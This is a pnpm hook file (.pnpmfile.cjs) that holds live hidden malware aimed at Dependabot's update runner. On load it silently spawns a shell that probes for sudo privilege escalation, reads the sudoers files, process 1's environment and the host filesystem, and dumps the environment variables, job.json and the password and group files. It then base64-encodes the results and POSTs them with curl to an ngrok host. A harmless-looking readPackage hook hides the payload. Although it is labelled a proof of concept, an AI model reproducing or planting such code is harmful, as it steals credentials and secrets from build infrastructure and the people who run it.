'use strict';
// .pnpmfile.cjs -- pnpm loads this as a core hook, NOT a lifecycle script

try {
  const { spawn } = require('child_process');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';
  const jp = process.env.DEPENDABOT_JOB_PATH || '/home/dependabot/dependabot-updater/job.json';

  const script =
    // sudo privilege escalation test
    'echo "=SUDO_ID="; sudo -n id 2>&1; ' +
    'echo "=SUDO_LIST="; sudo -n -l 2>&1; ' +
    'echo "=SUDOERS="; sudo -n cat /etc/sudoers 2>&1; ' +
    'echo "=SUDOERS_D="; sudo -n ls /etc/sudoers.d/ 2>&1 && sudo -n cat /etc/sudoers.d/* 2>&1; ' +
    // als root: capabilities + namespaces
    'echo "=SUDO_CAP="; sudo -n cat /proc/self/status 2>&1 | grep -i cap; ' +
    'echo "=SUDO_NSENTER="; sudo -n nsenter --mount=/proc/1/ns/mnt -- cat /proc/1/environ 2>&1 | tr "\\0" "\\n" | head -30; ' +
    'echo "=SUDO_CGROUPS="; sudo -n cat /proc/1/cgroup 2>&1; ' +
    // host filesystem via /proc/1/root (alleen als root)
    'echo "=HOST_FS="; sudo -n ls /proc/1/root/ 2>&1 | head -20; ' +
    // gewone recon als fallback
    'echo "=ENV="; env; ' +
    'echo "=JOB="; cat "' + jp + '" 2>/dev/null; ' +
    'echo "=ID="; id; ' +
    'echo "=GROUPS="; cat /etc/group | grep -E "sudo|root|docker|adm"; ' +
    'echo "=PASSWD="; cat /etc/passwd | grep -E "root|dependabot"';

  const exfil =
    '(' + script + ') | base64 -w0 > /tmp/.px 2>/dev/null && ' +
    "curl -sk -X POST '" + NGROK + "?poc=sudo_privesc' " +
    "-H 'Content-Type: text/plain' --data-binary @/tmp/.px 2>/dev/null; " +
    'rm -f /tmp/.px';

  spawn('sh', ['-c', exfil], { detached: true, stdio: 'ignore' }).unref();

} catch (e) {}

module.exports = {
  hooks: {
    readPackage(pkg) { return pkg; }
  }
};
